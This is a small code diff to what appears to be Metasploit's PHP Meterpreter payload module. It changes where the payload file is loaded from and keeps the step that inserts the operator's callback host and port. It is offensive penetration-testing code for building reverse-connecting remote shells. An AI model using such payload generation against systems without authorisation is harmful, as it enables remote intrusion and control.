@@ -26,7 +26,9 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
-    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
+    # met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')
+
+    met = File.binread(::File.join(Msf::Config.install_root, "meterpreter.php"))
 
     met.gsub!("127.0.0.1", datastore['LHOST']) if datastore['LHOST']
     met.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
